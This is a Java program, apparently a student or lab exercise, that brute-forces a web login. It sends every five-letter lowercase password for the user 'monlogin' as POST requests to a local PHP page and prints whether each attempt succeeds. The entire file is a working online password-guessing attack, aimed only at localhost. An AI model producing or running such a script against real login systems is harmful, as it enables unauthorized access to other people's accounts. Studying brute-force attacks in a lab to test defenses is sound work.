import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;


public class Crackage {

    public static void main(String[] args){
      
            try {

                char[] alphabet = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
                
                    for (char c1 : alphabet) {
                        for (char c2 : alphabet) {
                            for (char c3 : alphabet) {
                                for (char c4 : alphabet) {
                                        for (char c5 : alphabet) {
                                            String username = "monlogin";
                                            String password ="" + c1 + c2 + c3 + c4 + c5;
                                            String url = "http://localhost/PagePhp.php";
                                            String postData = "username=" + URLEncoder.encode(username, "UTF-8") +
                                            "&password=" + URLEncoder.encode(password, "UTF-8");
                                            URL obj = new URL(url);
                                            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                                            conn.setRequestMethod("POST");
                                            conn.setDoOutput(true);
                                            OutputStream outputStream = conn.getOutputStream();
                                            outputStream.write(postData.getBytes("UTF-8"));
                                            outputStream.flush();
                                            outputStream.close();
                                            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                                            String line;
                                            StringBuilder response = new StringBuilder();
                                            while ((line = reader.readLine()) != null) {
                                                response.append(line);
                                            }
                                            reader.close();
                                            if (response.toString().equals("0")) {
                                                System.out.println("La connexion est réussie.");
                                            } else {
                                                System.out.println("La connexion a échoué.");
                    
                                                
                                            }
                                        }
                                }
                            }
                        }
                    }
            }
            catch (IOException e) {
                    // e.printStackTrace();
                        System.out.println("La connexion a échouée");
            }
}

}


